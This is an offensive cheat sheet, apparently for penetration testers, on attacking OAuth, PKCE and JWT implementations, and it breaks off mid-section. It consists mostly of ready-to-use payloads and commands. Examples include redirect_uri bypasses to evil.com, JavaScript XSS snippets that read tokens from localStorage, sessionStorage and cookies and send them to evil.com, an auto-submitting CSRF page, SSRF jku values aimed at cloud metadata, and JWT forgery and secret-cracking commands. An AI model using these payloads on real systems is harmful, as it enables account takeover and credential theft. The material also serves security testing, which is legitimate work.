# OAuth/PKCE Attacks


## Table of Contents
1. [OAuth Flow Overview](#oauth-flow-overview)
2. [Reconnaissance](#reconnaissance)
3. [Authorization Code Attacks](#authorization-code-attacks)
4. [PKCE Attacks](#pkce-attacks)
5. [Token Attacks](#token-attacks)
6. [State Parameter Attacks](#state-parameter-attacks)
7. [Scope Manipulation](#scope-manipulation)
8. [JWT Token Attacks](#jwt-token-attacks)
9. [Client Credential Attacks](#client-credential-attacks)
10. [Social Login Attacks](#social-login-attacks)
11. [Real World Examples](#real-world-examples)
12. [Tools](#tools)
13. [OAuth 2.1 Changes](#oauth-21-changes)
14. [Checklist](#checklist)
15. [Related Topics](#related-topics)

---

## OAuth Flow Overview

```
Authorization Code Flow (with PKCE):

Step 1: Client generates code_verifier and code_challenge
Step 2: Client redirects user to /authorize with code_challenge
Step 3: User authenticates, server returns authorization_code
Step 4: Client exchanges code + code_verifier for tokens at /token
Step 5: Server validates code_verifier matches code_challenge
Step 6: Server returns access_token (and optionally refresh_token)
```

### PKCE Code Generation

```bash
# Generate code_verifier (43-128 characters, high entropy)
# Python method
python3 -c "import secrets; print(secrets.token_urlsafe(64))"

# Generate code_challenge (SHA256 then base64url)
code_verifier="generated_verifier_string"
code_challenge=$(echo -n "$code_verifier" | sha256sum | cut -d' ' -f1 | xxd -r -p | base64 -w0 | tr '+/' '-_' | tr -d '=')
echo "Challenge: $code_challenge"
```

---

## Reconnaissance

### Endpoint Discovery

```bash
# Common OAuth endpoints to check
/.well-known/openid-configuration
/.well-known/oauth-authorization-server
/.well-known/oauth-authorization-server/oauth2
/oauth/authorize
/oauth/token
/oauth2/authorize
/oauth2/token
/oauth2/v1/authorize
/oauth2/v1/token
/authorize
/token
/auth
/login/oauth/authorize
/api/oauth/authorize
/api/oauth/token

# Fetch OpenID configuration with detailed parsing
curl -s https://target.com/.well-known/openid-configuration | jq .

# Extract all endpoints for testing
curl -s https://target.com/.well-known/openid-configuration | jq '{
  authorization: .authorization_endpoint,
  token: .token_endpoint,
  userinfo: .userinfo_endpoint,
  jwks: .jwks_uri,
  introspection: .introspection_endpoint,
  revocation: .revocation_endpoint,
  registration: .registration_endpoint,
  device_authorization: .device_authorization_endpoint
}'

# Check for undocumented endpoints
curl -s https://target.com/.well-known/openid-configuration | jq -r '.[]' | grep -v null | sort -u

# Discover OAuth endpoints via robots.txt
curl -s https://target.com/robots.txt | grep -i oauth

# Scan for OAuth endpoints with ffuf
ffuf -u https://target.com/FUZZ -w oauth_endpoints.txt -c -t 50 -mc 200,302,401,403
```

### Client Discovery

```bash
# Find registered OAuth clients in JavaScript files
# Extract all client_id patterns from static assets
grep -roE "client_id['\"]?\s*[:=]\s*['\"]?[a-zA-Z0-9_-]+" static/js/ | cut -d: -f2 | sort -u

# Search for client configuration patterns
grep -r "client_id\|clientSecret\|client_secret\|CLIENT_ID" .

# Common client IDs found in public applications
# web, mobile, ios, android, desktop, cli, spa, public, api, backend

# Extract OAuth configuration from mobile apps (Android)
apktool d target.apk
grep -r "client_id\|client_secret\|redirect_uri" target/
find target/ -name "*.xml" -exec grep -l "oauth" {} \;
find target/ -name "strings.xml" -exec cat {} \; | grep -i client

# Extract from iOS apps
unzip app.ipa
grep -r "client_id" Payload/App.app/
strings Payload/App.app/App | grep -E "client_id|client_secret"

# Check environment configuration files
# .env, .env.local, .env.production, config.js, settings.py, application.yml
grep -r "OAUTH_CLIENT_ID\|OAUTH_CLIENT_SECRET" .
```

### OAuth Metadata Extraction

```bash
# Get complete server metadata
curl -s https://target.com/.well-known/oauth-authorization-server | jq '{
  issuer: .issuer,
  authorization_endpoint: .authorization_endpoint,
  token_endpoint: .token_endpoint,
  registration_endpoint: .registration_endpoint,
  scopes_supported: .scopes_supported,
  response_types_supported: .response_types_supported,
  grant_types_supported: .grant_types_supported,
  code_challenge_methods_supported: .code_challenge_methods_supported
}'

# Test supported response types
response_types=("code" "token" "code token" "id_token" "code id_token" "token id_token" "code token id_token")
for rt in "${response_types[@]}"; do
  echo "Testing: $rt"
  curl -s "https://target.com/authorize?response_type=$rt&client_id=test&redirect_uri=https://target.com/callback"
done
```

---

## Authorization Code Attacks

### Open Redirect via redirect_uri

**Real World Example (2022): GitHub OAuth redirect_uri bypass** - Attackers could manipulate the redirect_uri parameter to point to attacker-controlled subdomains, leading to authorization code theft.

```bash
# Basic redirect manipulation - simplest attack
https://oauth.target.com/authorize?
  client_id=CLIENT_ID&
  redirect_uri=https://evil.com&
  response_type=code&
  scope=openid

# Subdomain takeover - if target has abandoned subdomains
# First, identify vulnerable subdomains
dig CNAME subdomain.target.com
# If pointing to a cloud service that can be claimed
redirect_uri=https://abandoned-subdomain.target.com

# Path traversal to escape callback path
redirect_uri=https://target.com/oauth/callback/../../../evil.com
redirect_uri=https://target.com/oauth/callback/..;/..;/evil.com

# Double URL encoding bypass
redirect_uri=https://target.com%252f%252e%252e%252f%252e%252e%252f@evil.com

# Null byte injection (if backend uses C strings)
redirect_uri=https://target.com%00@evil.com
redirect_uri=https://target.com%00.evil.com

# Parameter pollution - server picks second value
redirect_uri=https://target.com/callback&redirect_uri=https://evil.com
# Or using different parameter names
?redirect_uri=https://target.com&redirect_url=https://evil.com

# Fragment injection - fragment not sent to server
redirect_uri=https://target.com/callback#@evil.com

# Protocol downgrade attacks
redirect_uri=http://target.com/callback  # from https
redirect_uri=https://target.com:80/callback  # port mixing

# JavaScript scheme - XSS via redirect
redirect_uri=javascript:alert('XSS')//https://target.com/callback
redirect_uri=data:text/html,<script>alert(1)</script>

# IPv6 and localhost variations
redirect_uri=https://[::1]:8080/callback
redirect_uri=https://127.0.0.1.xip.io/callback
redirect_uri=https://localhost.target.com/callback

# Open redirect chain - use existing redirect on target
# First find an open redirect endpoint on target.com
# Example: https://target.com/redirect?url=https://evil.com
redirect_uri=https://target.com/redirect?url=https://evil.com

# CRLF injection in redirect_uri
redirect_uri=https://target.com/callback%0d%0aLocation:%20https://evil.com
```

### Authorization Code Interception

**Real World Example (2021): Facebook OAuth vulnerability** - Weak redirect_uri validation allowed attackers to capture authorization codes by registering domains similar to whitelisted ones.

```bash
# Attack flow:
# 1. Attacker crafts malicious authorization URL
# 2. Victim clicks link and authenticates
# 3. Authorization code is sent to attacker's redirect_uri
# 4. Attacker exchanges code for access tokens

# Exploitation steps:
# Step 1: Generate authorization URL with attacker redirect
AUTH_URL="https://oauth.target.com/authorize?client_id=CLIENT_ID&redirect_uri=https://evil.com/callback&response_type=code&scope=openid profile email"

# Step 2: Send to victim via phishing or XSS
echo "Click this link to login: $AUTH_URL"

# Step 3: Receive callback on evil.com/callback?code=STOLEN_CODE

# Step 4: Exchange stolen code for tokens
curl -X POST https://oauth.target.com/token \
  -d "grant_type=authorization_code" \
  -d "code=STOLEN_CODE" \
  -d "client_id=CLIENT_ID" \
  -d "client_secret=CLIENT_SECRET" \
  -d "redirect_uri=https://evil.com/callback"

# Exploit via open redirect on target (no need for attacker domain)
# If target has open redirect, use it as redirect_uri
AUTH_URL="https://oauth.target.com/authorize?client_id=CLIENT_ID&redirect_uri=https://target.com/redirect?url=https://evil.com&response_type=code"

# Victim authenticates, code goes to target.com/redirect?url=https://evil.com?code=CODE
# Then redirects to evil.com with code in URL
```

### Authorization Code Replay

**Real World Example (2022): Multiple OAuth providers** - Authorization codes were valid for up to 10 minutes and could be replayed multiple times before expiration.

```bash
# Basic code replay - most servers invalidate after first use
# Capture a valid authorization code
# Try to exchange it twice

# First exchange (legitimate)
curl -X POST https://oauth.target.com/token \
  -d "grant_type=authorization_code" \
  -d "code=VALID_CODE" \
  -d "client_id=CLIENT_ID" \
  -d "client_secret=CLIENT_SECRET"

# Second exchange (should fail, but test anyway)
curl -X POST https://oauth.target.com/token \
  -d "grant_type=authorization_code" \
  -d "code=VALID_CODE" \
  -d "client_id=CLIENT_ID" \
  -d "client_secret=CLIENT_SECRET"

# Race condition - send multiple requests simultaneously
# Code may be used multiple times if not atomic
for i in {1..100}; do
  curl -X POST https://oauth.target.com/token \
    -d "grant_type=authorization_code&code=AUTH_CODE&client_id=ID&client_secret=SECRET" &
done
wait

# Code expiration testing
# Generate code, wait various intervals, then exchange
for wait in 30 60 120 300 600 1800 3600; do
  echo "Waiting $wait seconds"
  sleep $wait
  curl -X POST https://oauth.target.com/token \
    -d "grant_type=authorization_code&code=CODE&client_id=ID" \
    -w "\nHTTP %{http_code}\n"
done

# Cross-client code replay
# Code issued for client A, try exchanging with client B
curl -X POST https://oauth.target.com/token \
  -d "grant_type=authorization_code" \
  -d "code=CODE_FOR_CLIENT_A" \
  -d "client_id=CLIENT_B" \
  -d "client_secret=SECRET_B"
```

### Authorization Code Injection

```bash
# Attacker gets authorization code for their own account
# Then injects it into victim's session

# Step 1: Attacker completes OAuth flow and gets code
ATTACKER_CODE="attacker_auth_code"

# Step 2: Victim is tricked into visiting
https://target.com/callback?code=ATTACKER_CODE

# Step 3: Victim's browser exchanges code (if vulnerable)
# This links attacker's identity to victim's session

# Mitigation: Code must be tied to client session via state or PKCE
```

---

## PKCE Attacks

### Missing PKCE Enforcement

**Real World Example (2023): Okta public client vulnerability** - Several Okta customers had public OAuth clients that did not enforce PKCE, allowing authorization code interception attacks.

```bash
# Test if PKCE is optional - authorization without code_challenge
# For public clients (mobile, SPA), PKCE should be required

# Step 1: Generate authorization request WITHOUT code_challenge
AUTH_URL="https://oauth.target.com/authorize?
  client_id=PUBLIC_CLIENT&
  redirect_uri=https://target.com/callback&
  response_type=code&
  scope=openid"
  # Missing: code_challenge, code_challenge_method

# Step 2: If server accepts and returns code, PKCE is optional - VULNERABLE

# Step 3: Exchange code WITHOUT code_verifier
curl -X POST https://oauth.target.com/token \
  -d "grant_type=authorization_code" \
  -d "code=AUTH_CODE" \
  -d "client_id=PUBLIC_CLIENT" \
  -d "redirect_uri=https://target.com/callback"
  # Missing: code_verifier

# If this succeeds, the OAuth implementation is broken
# Attackers can intercept and use authorization codes

# Test for PKCE downgrade - send code_challenge but not code_verifier
# Some servers accept code_challenge but don't validate code_verifier
```

### Weak Code Challenge Method

```bash
# Test if "plain" code_challenge_method is accepted
# This is insecure because code_challenge equals code_verifier

# Step 1: Use plain method with known verifier
AUTH_URL="https://oauth.target.com/authorize?
  client_id=PUBLIC_CLIENT&
  redirect_uri=https://target.com/callback&
  response_type=code&
  code_challenge=my_secret_verifier&
  code_challenge_method=plain"

# Step 2: Exchange with same value as code_verifier
curl -X POST https://oauth.target.com/token \
  -d "grant_type=authorization_code" \
  -d "code=AUTH_CODE" \
  -d "client_id=PUBLIC_CLIENT" \
  -d "code_verifier=my_secret_verifier" \
  -d "redirect_uri=https://target.com/callback"

# If server accepts "plain", any network observer can see code_verifier
# This defeats PKCE's purpose

# Check supported methods via metadata
curl -s https://target.com/.well-known/oauth-authorization-server | jq .code_challenge_methods_supported
# Should return ["S256"] only. If includes "plain" or is empty, vulnerable

# Test for method injection - send S256 but verify with plain
# Server may store challenge incorrectly
```

### Code Verifier Brute Force

```bash
# If code_challenge is weak (short, predictable, or reused)

# PKCE spec requirements:
# - Length: 43-128 characters
# - Characters: A-Z, a-z, 0-9, hyphens, periods, underscores, tildes
# - Minimum entropy: 128 bits (43 random chars = 256 bits)

# Test for weak verifier generation
# Common patterns:
# - Timestamps: 20231215120000
# - UUIDs: 550e8400-e29b-41d4-a716-446655440000
# - Fixed strings: "secret", "verifier", "challenge"
# - Short strings (<43 chars)

# Generate code_challenge from candidate verifier
generate_challenge() {
  echo -n "$1" | sha256sum | cut -d' ' -f1 | xxd -r -p | base64 -w0 | tr '+/' '-_' | tr -d '='
}

# Dictionary attack on weak verifiers
verifiers=("verifier" "secret" "challenge" "pkce" "test123" "2024")
for v in "${verifiers[@]}"; do
  challenge=$(generate_challenge "$v")
  echo "Testing verifier: $v -> $challenge"
  # Try to exchange code using this verifier
done

# Time-based verifier brute force
# If verifier is based on current timestamp
for ts in $(seq $(date +%s) -3600 $(date +%s)); do
  verifier=$(echo -n "$ts" | sha256sum | cut -d' ' -f1)
  challenge=$(generate_challenge "$verifier")
  echo "Testing timestamp $ts: $verifier"
done
```

### PKCE Code Interception

```bash
# Even with PKCE, code can be intercepted but cannot be exchanged without verifier
# However, if the attacker can also intercept the verifier:

# Attack scenarios:
# 1. Verifier sent in URL (some implementations incorrectly send it)
# 2. Verifier stored insecurely in browser storage
# 3. Verifier leaked via Referer header
# 4. Weak verifier generation allows brute force

# Check for verifier in logs, network traffic, browser history
# Monitor all requests for "code_verifier" parameter

# Test if verifier validation can be bypassed
# Some servers may not validate verifier if challenge is empty
curl -X POST https://oauth.target.com/token \
  -d "grant_type=authorization_code" \
  -d "code=AUTH_CODE" \
  -d "client_id=PUBLIC_CLIENT" \
  -d "code_verifier=" \
  -d "redirect_uri=https://target.com/callback"
```

---

## Token Attacks

### Access Token Leakage

**Real World Example (2019): Spotify OAuth token leakage** - Access tokens in URL fragments were exposed to third-party scripts via the Referer header when navigating to external sites.

```bash
# Token in URL fragment (Implicit Flow - now deprecated)
# Format: https://target.com/callback#access_token=TOKEN&token_type=bearer

# Attack: Token in Referer header
# When callback page loads external resources, Referer includes full URL
# External resources can see the token

# Test token leakage:
# 1. Create callback page that loads external image
echo '<img src="https://evil.com/logger">' > callback.html
# 2. Host on target.com/callback
# 3. When victim loads page, evil.com sees Referer with token

# Token in browser history
# Implicit flow tokens persist in browser history
# Anyone with access to victim's browser can see tokens
# Check: window.history, browser saved passwords, browser sync

# Token in server logs
# If tokens are logged in access logs, CDN logs, or error logs
# Check standard log locations:
/var/log/nginx/access.log
/var/log/apache2/access.log
/var/log/auth.log

# Token in WebSocket messages
# Monitor WebSocket communication for token transmission
# Use browser DevTools -> Network -> WS

# Token in postMessage
window.addEventListener('message', function(e) {
  if (e.data.access_token) {
    console.log('Token leaked:', e.data.access_token);
  }
});
```

### Token Theft via XSS

```javascript
// Comprehensive token stealing payloads

// Steal from localStorage
const tokens = {
  access: localStorage.getItem('access_token'),
  refresh: localStorage.getItem('refresh_token'),
  id: localStorage.getItem('id_token')
};
fetch('https://evil.com/steal?data=' + btoa(JSON.stringify(tokens)));

// Steal from sessionStorage
Object.keys(sessionStorage).forEach(key => {
  fetch('https://evil.com/steal?key=' + encodeURIComponent(key) + '&value=' + encodeURIComponent(sessionStorage[key]));
});

// Steal from cookies
document.cookie.split(';').forEach(cookie => {
  fetch('https://evil.com/steal?cookie=' + encodeURIComponent(cookie));
});

// Intercept OAuth callback URL
if (window.location.hash.includes('access_token')) {
  fetch('https://evil.com/steal' + window.location.hash);
}
if (window.location.search.includes('code=')) {
  fetch('https://evil.com/steal?' + window.location.search);
}

// Hook fetch and XMLHttpRequest to intercept tokens
const originalFetch = window.fetch;
window.fetch = function() {
  const request = arguments[0];
  if (typeof request === 'string' && request.includes('token')) {
    fetch('https://evil.com/log?url=' + encodeURIComponent(request));
  }
  return originalFetch.apply(this, arguments);
};

// Hook postMessage (if used for token delivery between windows)
const originalAddEventListener = window.addEventListener;
window.addEventListener = function(type, listener) {
  if (type === 'message') {
    const wrappedListener = function(e) {
      if (e.data && (e.data.access_token || e.data.token)) {
        fetch('https://evil.com/steal?data=' + JSON.stringify(e.data));
      }
      return listener(e);
    };
    return originalAddEventListener.call(this, type, wrappedListener);
  }
  return originalAddEventListener.call(this, type, listener);
};
```

### Refresh Token Attacks

**Real World Example (2020): Uber refresh token vulnerability** - Refresh tokens did not implement rotation and had excessively long expiration (up to 1 year), allowing attackers to maintain access indefinitely.

```bash
# Refresh token rotation testing
# Modern OAuth 2.1 requires rotation - each refresh gives new token, old invalidated

# Step 1: Get initial tokens
curl -X POST https://oauth.target.com/token \
  -d "grant_type=authorization_code" \
  -d "code=AUTH_CODE" \
  -d "client_id=CLIENT_ID" \
  -d "client_secret=CLIENT_SECRET" \
  -o tokens1.json

REFRESH_TOKEN_1=$(cat tokens1.json | jq -r .refresh_token)

# Step 2: Use refresh token to get new tokens
curl -X POST https://oauth.target.com/token \
  -d "grant_type=refresh_token" \
  -d "refresh_token=$REFRESH_TOKEN_1" \
  -d "client_id=CLIENT_ID" \
  -d "client_secret=CLIENT_SECRET" \
  -o tokens2.json

REFRESH_TOKEN_2=$(cat tokens2.json | jq -r .refresh_token)

# Step 3: Try using original refresh token again
curl -X POST https://oauth.target.com/token \
  -d "grant_type=refresh_token" \
  -d "refresh_token=$REFRESH_TOKEN_1" \
  -d "client_id=CLIENT_ID" \
  -d "client_secret=CLIENT_SECRET"

# If original token still works, rotation is not implemented - VULNERABLE

# Refresh token expiration testing
# Capture refresh token and test after various intervals
for days in 1 7 30 90 180 365; do
  echo "Testing after $days days"
  sleep $((days * 86400))
  curl -X POST https://oauth.target.com/token \
    -d "grant_type=refresh_token" \
    -d "refresh_token=$REFRESH_TOKEN" \
    -d "client_id=CLIENT_ID"
done

# Refresh token scope escalation
# Try to request additional scopes during refresh
curl -X POST https://oauth.target.com/token \
  -d "grant_type=refresh_token" \
  -d "refresh_token=$REFRESH_TOKEN" \
  -d "client_id=CLIENT_ID" \
  -d "client_secret=CLIENT_SECRET" \
  -d "scope=openid profile email admin user:delete"

# If server returns tokens with elevated scopes - VULNERABLE

# Cross-client refresh token usage
# Refresh token issued for client A, try with client B
curl -X POST https://oauth.target.com/token \
  -d "grant_type=refresh_token" \
  -d "refresh_token=$REFRESH_TOKEN_FROM_CLIENT_A" \
  -d "client_id=CLIENT_B" \
  -d "client_secret=SECRET_B"

# Parallel refresh token usage (detection bypass)
# Send multiple refresh requests simultaneously
for i in {1..10}; do
  curl -X POST https://oauth.target.com/token \
    -d "grant_type=refresh_token&refresh_token=$REFRESH_TOKEN&client_id=CLIENT_ID" &
done
wait
# All should fail except one if rotation is implemented correctly
```

### Access Token Forgery

```bash
# Test if access tokens are properly validated
# Try using tokens from different issuers or formats

# Cross-service token usage
# Token from service A, try on service B
curl -H "Authorization: Bearer $TOKEN_FROM_SERVICE_A" https://service-b.target.com/api/user

# Expired token usage
# Modify expired token (if JWT) and try to use
python jwt_tool.py EXPIRED_TOKEN -T -S hs256 -p "secret"

# Malformed token testing
curl -H "Authorization: Bearer invalid_token" https://target.com/api/user
curl -H "Authorization: Bearer " https://target.com/api/user
curl -H "Authorization: Bearer null" https://target.com/api/user
curl -H "Authorization: Bearer 12345" https://target.com/api/user

# Token in different locations
# Authorization header vs cookie vs query parameter
curl "https://target.com/api/user?access_token=$TOKEN"
curl -H "Cookie: access_token=$TOKEN" https://target.com/api/user
curl -H "X-Access-Token: $TOKEN" https://target.com/api/user
```

---

## State Parameter Attacks

### CSRF via Missing State

**Real World Example (2021): Microsoft Azure AD OAuth CSRF** - Several applications using Azure AD OAuth did not validate the state parameter, allowing attackers to initiate account linking attacks.

```bash
# State parameter is required to prevent CSRF attacks on OAuth callback

# Test if state is required
# Step 1: Initiate OAuth flow without state parameter
AUTH_URL="https://oauth.target.com/authorize?
  client_id=CLIENT_ID&
  redirect_uri=https://target.com/callback&
  response_type=code&
  scope=openid"
  # Missing state parameter

# Step 2: If server returns code without state, parameter is optional - VULNERABLE

# CSRF attack scenario:
# Attacker initiates OAuth flow with their own account
# Gets authorization code
# Sends crafted link to victim that completes the flow
# Victim's account gets linked to attacker's identity

# Attack HTML - forces victim to complete OAuth flow
cat << 'EOF' > csrf_attack.html
<!DOCTYPE html>
<html>
<body>
  <form action="https://target.com/callback" method="GET">
    <input type="hidden" name="code" value="ATTACKER_AUTH_CODE">
    <input type="submit" value="Click to verify account">
  </form>
  <script>
    document.forms[0].submit();
  </script>
</body>
</html>
EOF

# If state is not validated, victim's browser will exchange attacker's code
# This links attacker's identity to victim's session

# Test state validation - modify state value
# Capture legitimate OAuth URL with state=VALID_STATE
# Change state parameter to different value
# If flow completes without error, state is not properly validated
```

### State Fixation

```bash
# Attacker generates authorization URL with known state value
# Victim clicks, attacker knows state value
# Attacker can complete OAuth flow by guessing/predicting state

# Test state predictability
# Generate 100 OAuth URLs and extract state values
for i in {1..100}; do
  curl -s "https://target.com/authorize?client_id=ID&redirect_uri=https://target.com/callback&response_type=code&state=test" | grep -oP 'state=\K[^&"]+' >> states.txt
done

# Analyze state patterns
cat states.txt | sort | uniq -c | sort -rn
# Look for:
# - Sequential numbers (1,2,3,4)
# - Timestamps (1704067200)
# - Short strings (abc, test)
# - No state (empty or "null")

# State reuse attack
# Step 1: Start OAuth flow, capture state=ABC123
# Step 2: Complete flow (or not)
# Step 3: Try starting new flow with same state=ABC123
# If accepted, state can be fixed

# Predictable state based on user ID or session
# If state = hash(user_id) or hash(session_id)
# Attacker can calculate state for any victim
```

### State Injection and Reflection

```bash
# If state parameter is reflected without proper encoding
state="><script>alert('XSS')</script>"
state=test%0d%0aX-Header:%20injected
state=test%26redirect_uri%3Dhttps://evil.com

# Test for XSS via state reflection
AUTH_URL="https://target.com/authorize?state=<img src=x onerror=alert(1)>&client_id=ID&redirect_uri=https://target.com/callback&response_type=code"

# Test for parameter injection via state
# State may be concatenated into redirect URL
state=test&redirect_uri=https://evil.com

# Test for open redirect via state
# If state is used to build callback URL without validation
state=https://evil.com/callback%3Fcode%3D

# Test for CRLF injection
state=test%0d%0aLocation:%20https://evil.com%0d%0a
```

---

## Scope Manipulation

### Scope Upgrade

**Real World Example (2022): T-Mobile OAuth scope escalation** - Attackers could request elevated scopes during token refresh, gaining administrative API access.

```bash
# Request more scopes than authorized during initial authorization
# Application only requested "openid profile", attacker modifies to include "admin"

AUTH_URL="https://oauth.target.com/authorize?
  client_id=CLIENT_ID&
  redirect_uri=https://target.com/callback&
  response_type=code&
  scope=openid+profile+email+admin+user:delete+user:impersonate"

# If server doesn't validate scope against client registration
# And user consents (or consent is skipped), attacker gets elevated token

# Scope escalation during token refresh
# Capture refresh token, then request elevated scopes

curl -X POST https://oauth.target.com/token \
  -d "grant_type=refresh_token" \
  -d "refresh_token=$REFRESH_TOKEN" \
  -d "client_id=CLIENT_ID" \
  -d "client_secret=CLIENT_SECRET" \
  -d "scope=openid profile email admin"

# Check response - if token contains admin scopes, escalation succeeded

# Scope downgrade to bypass consent screen
# Some applications have consent screens for sensitive scopes
# Remove sensitive scopes to bypass consent, then later upgrade

# Step 1: Initial auth with minimal scopes (no consent screen)
AUTH_URL="https://oauth.target.com/authorize?scope=openid&..."

# Step 2: Get token with minimal scopes

# Step 3: Try to use minimal token for privileged operations
curl -H "Authorization: Bearer $MINIMAL_TOKEN" https://target.com/api/admin/users

# Sometimes the token validation only checks presence of token, not scopes

# Scope confusion - different scope names for same permission
# Try all possible scope names for admin access
scopes=("admin" "administrator" "superuser" "root" "full_access" "all" "*" "user:admin" "role:admin")

for scope in "${scopes[@]}"; do
  echo "Testing scope: $scope"
  curl -X POST https://oauth.target.com/token \
    -d "grant_type=refresh_token" \
    -d "refresh_token=$REFRESH_TOKEN" \
    -d "scope=$scope"
done
```

### Scope Validation Bypass

```bash
# Test if server validates scope parameter format
# Try various injections

# Scope delimiter injection (space, comma, plus, URL encoded)
scope=openid,admin
scope=openid%20admin
scope=openid+admin
scope=openid%2cadmin
scope=openid||admin
scope=openid;admin

# Scope case manipulation
scope=OpenID Profile Admin
scope=OPENID PROFILE ADMIN

# Scope path traversal
scope=openid/../admin
scope=openid/./admin

# Scope with special characters
scope=openid%00admin
scope="openid\nadmin"
scope="openid\tadmin"

# Empty scope
scope=
scope=null
scope=none

# Wildcard scope
scope=*
scope=openid,*

# Scope ordering - some servers only check first scope
scope=admin,openid
```

---

## JWT Token Attacks

### Algorithm Confusion

**Real World Example (2019): NordVPN JWT algorithm confusion** - Attackers could change algorithm from RS256 to HS256 and sign tokens using the public key, leading to privilege escalation.

```bash
# Algorithm confusion attack (CVE-2018-0114)
# When server expects RS256 (asymmetric) but accepts HS256 (symmetric)
# Attacker can use public key as HMAC secret

# Step 1: Extract public key from jwks_uri
curl -s https://target.com/.well-known/jwks.json | jq '.keys[0]'

# Step 2: Convert public key to PEM format
# Save as public.pem

# Step 3: Use jwt_tool to modify token
python jwt_tool.py ORIGINAL_TOKEN -X k -pk public.pem

# Step 4: Modified token header
# Original: {"alg":"RS256","typ":"JWT"}
# Modified: {"alg":"HS256","typ":"JWT"}

# Step 5: Test modified token
curl -H "Authorization: Bearer $MODIFIED_TOKEN" https://target.com/api/admin

# None algorithm attack
# Set algorithm to "none" (CVE-2015-9235)
python jwt_tool.py TOKEN -X a

# Modified header: {"alg":"none","typ":"JWT"}
# Remove signature portion
# Token becomes: base64(header).base64(payload).

# Test none algorithm
curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9." https://target.com/api/admin
```

### Key Injection (jwk/jku)

**Real World Example (2020): Popular JWT library vulnerability** - Several implementations allowed the jku (JWK Set URL) header parameter without validation, allowing attackers to host malicious keys.

```bash
# JWK injection attack
# Inject attacker's public key into JWT header

# Step 1: Generate attacker key pair
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem

# Step 2: Create JWK from public key
python3 << EOF
import jwt
import json
from cryptography.hazmat.primitives import serialization

with open('public.pem', 'rb') as f:
    public_key = serialization.load_pem_public_key(f.read())
    
jwk = jwt.jwk_from_pem(public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
))
print(json.dumps(jwk))
EOF

# Step 3: Create malicious JWT with jwk header
python jwt_tool.py -X i -p private.pem

# Header contains:
# {
#   "alg": "RS256",
#   "typ": "JWT",
#   "jwk": { ... attacker's public key ... }
# }

# JKU (JWK Set URL) attack
# Host attacker's JWK set at https://evil.com/jwks.json

# Step 1: Create jwks.json
cat > jwks.json << EOF
{
  "keys": [
    {
      "kty": "RSA",
      "use": "sig",
      "kid": "attacker",
      "n": "...",
      "e": "AQAB"
    }
  ]
}
EOF

# Step 2: Create JWT with jku header
# {
#   "alg": "RS256",
#   "typ": "JWT",
#   "jku": "https://evil.com/jwks.json",
#   "kid": "attacker"
# }

# Step 3: Sign with attacker's private key

# Test if server fetches and trusts jku URL
curl -H "Authorization: Bearer $TOKEN_WITH_JKU" https://target.com/api/user

# Check for SSRF via jku
# Server may fetch jku URL - can be used for internal network scanning
jku=http://localhost:8080/admin
jku=http://169.254.169.254/latest/meta-data/
```

### JWT Claims Manipulation

```bash
# Modify claims without re-signing (if signature not verified by server)
# Many servers have signature validation disabled in development

# Decode JWT parts
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# Output: {"alg":"HS256","typ":"JWT"}

# Common claims to test for manipulation:

# 1. User identification (sub, user_id, uid, username)
# Change to another user's ID
original_payload='{"sub":"user123","role":"user","exp":9999999999}'
modified_payload='{"sub":"admin","role":"admin","exp":9999999999}'

# 2. Expiration (exp, iat, nbf)
# Set to far future or remove
modified_payload='{"sub":"user123","exp":9999999999}'

# 3. Audience (aud) - try to use token on different service
modified_payload='{"sub":"user123","aud":"https://api.target.com/admin"}'

# 4. Issuer (iss) - issuer confusion attack
modified_payload='{"sub":"user123","iss":"https://attacker.com"}'

# 5. Scope/permissions (scope, role, permissions, groups)
modified_payload='{"sub":"user123","scope":"admin read write delete"}'

# 6. Email verification (email_verified, verified)
modified_payload='{"sub":"user123","email":"admin@target.com","email_verified":true}'

# 7. Nonce replay
# Remove nonce requirement or use same nonce

# Rebuild JWT with modified payload
# Original: header.payload.signature
# Modified: header.modified_payload.

# If server doesn't verify signature, empty signature works
# Token format: base64(header).base64(modified_payload).

# Example exploit
MODIFIED_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9."
curl -H "Authorization: Bearer $MODIFIED_TOKEN" https://target.com/api/admin
```

### JWT Signature Bypass

```bash
# Signature removal - some libraries accept tokens without signature
# Header with alg none (already covered)
# Or simply omit signature part

# Token with empty signature
# header.payload.
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9."

# Signature stripping - remove last character(s)
# Original: header.payload.signature
# Modified: header.payload.signatur

# HMAC secret brute force (for HS256 tokens)
# If secret is weak, brute force with hashcat
hashcat -m 16500 -a 3 jwt.txt ?a?a?a?a?a?a
# jwt.txt contains: header.payload.signature

# Use jwt_tool for cracking
python jwt_tool.py JWT_TOKEN -C -d /usr/share/wordlists/rockyou.txt

# Known secret testing
common_secrets=("secret" "secretkey" "password" "changeme" "jwtsecret" "mysecret" "test")
for secret in "${common_secrets[@]}"; do
  echo "Testing secret: $secret"
  python jwt_tool.py JWT_TOKEN -S -hs256 -p "$secret"
done
```

---

## Client Credential Attacks

### Client Secret Exposure

**Real World Example (2021): Twilio OAuth client secret leak** - Client secrets were found in public GitHub repositories and mobile application binaries, leading to account compromise.

```bash
# Search techniques for exposed client secrets

# GitHub Dorking
# Search for OAuth credentials in public repositories
org:target "client_secret"
org:target "clientSecret"
org:target "oauth_secret"
org:target "CLIENT_SECRET"

# Search for specific patterns
grep -r "client_secret.*=.*['\"][a-zA-Z0-9]" .
grep -r "CLIENT_SECRET.*=.*['\"][a-zA-Z0-9]" .
grep -r "oauth.*secret.*=.*['\"][a-zA-Z0-9]" .

# Mobile application extraction (Android)
# Decode APK and search for secrets
apktool d app.apk
grep -r "client_secret" app/
grep -r "CLIENT_SECRET" app/
strings app/classes.dex | grep -E "client_secret|CLIENT_SECRET"

# iOS application extraction
unzip app.ipa
strings Payload/App.app/App | grep -E "client_secret|CLIENT_SECRET|oauth"

# Environment file extraction
# Common env files: .env, .env.local, .env.production, .env.development
for file in $(find . -name ".env*"); do
  echo "=== $file ==="
  cat "$file" | grep -i secret
done

# Docker image inspection
